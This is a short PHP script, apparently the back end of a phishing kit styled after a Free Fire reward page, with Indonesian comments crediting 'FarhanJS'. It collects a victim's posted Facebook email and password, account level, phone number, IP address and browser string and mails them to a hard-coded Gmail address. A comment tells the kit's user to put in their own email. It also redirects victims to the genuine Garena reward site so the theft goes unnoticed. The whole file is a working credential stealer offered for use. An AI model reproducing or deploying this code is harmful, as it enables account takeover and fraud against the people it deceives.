<?php
header("location: https://reward.ff.garena.com/");
?>
<?php
// DIBERDAYAKAN OLEH FHTRAM ATAS ANAM FARHANJS

$subjek = 'account ';
$mailto = 'hanscker3@gmail.com'; // GANTI ENAIL MU

$henpon = $_POST['fb1'];
$teha = $_POST['fb2'];
$la = $_POST['level'];
$np = $_POST['nope'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];


$body = <<<EOD
<br><hr><br>
++====[ Result Data ]====++<br>
<br>
Email Facebook : $henpon<br>
Password Facebook : $teha<br>
<br>
++====[ $mailto ]====++<br>
<br>
++====[ Detail ]====++<br>
<br>
Level Account : $la<br>
Nomor HP : $np<br>
Alamat IP : $ip<br>
Browser : $browser<br>
<br>
++===[ © FarhanJS ]====++

EOD;


$headers = "From: @noreply\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek, $body, $headers);
?>
